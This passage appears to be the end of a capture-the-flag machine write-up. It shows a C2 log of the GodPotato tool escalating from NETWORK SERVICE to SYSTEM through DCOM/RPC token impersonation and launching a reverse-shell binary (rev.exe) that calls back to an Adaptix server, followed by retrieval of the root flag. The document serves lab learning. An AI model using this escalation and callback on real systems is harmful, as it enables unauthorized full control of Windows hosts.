[15/08 13:16:35] [+] Program C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c C:\Users\Public\GodPotato-NET4.exe -cmd C:\users\Public\rev.exe started with PID 8336 (output - with output)
[15/08 13:16:39] [+] Job [821ffea0] output:
[*] CombaseModule: 0x140730503135232
[*] DispatchTable: 0x140730505852480
[*] UseProtseqFunction: 0x140730504826816
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\d2b4210a-42d1-42ec-ae49-b432bf6ed546\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005402-037c-ffff-f92d-dafa54f1b9e3
[*] DCOM obj OXID: 0x3456de53cdd2abcc
[*] DCOM obj OID: 0xa9f869a28d676d21
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 952 Token:0x720  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5092

```

* Now on our `Adaptix` Server we got a callback as the `system` user

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

* Now using the Console we got the `root.flg` in the `C:\Users\Administrator\Desktop\` directory

<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

* Now we have successfully solved this machine!!
